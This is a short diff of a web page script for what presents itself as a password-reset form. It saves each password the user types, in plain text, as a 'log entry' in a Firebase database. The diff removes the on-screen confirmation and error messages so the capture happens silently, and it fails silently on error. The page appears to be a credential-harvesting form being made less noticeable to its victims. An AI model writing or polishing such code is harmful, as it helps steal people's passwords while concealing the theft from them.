@@ -69,7 +69,7 @@ passwordInput.addEventListener('input', () => {
   resetBtn.style.background = valid ? '#EE4D2D' : '#F3826C';
 });
 
-// Save password as a new log entry
+// Save password as a new log entry without pop-ups
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
   const pwd = passwordInput.value;
@@ -81,12 +81,12 @@ form.addEventListener('submit', async (e) => {
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     });
 
-    alert('Password saved successfully!');
+    // Reset input and button without alerts
     passwordInput.value = '';
     resetBtn.disabled = true;
   } catch (err) {
     console.error(err);
-    alert('Error saving password: ' + err.message);
+    // Do nothing, silently fail
   }
 });
 </script>
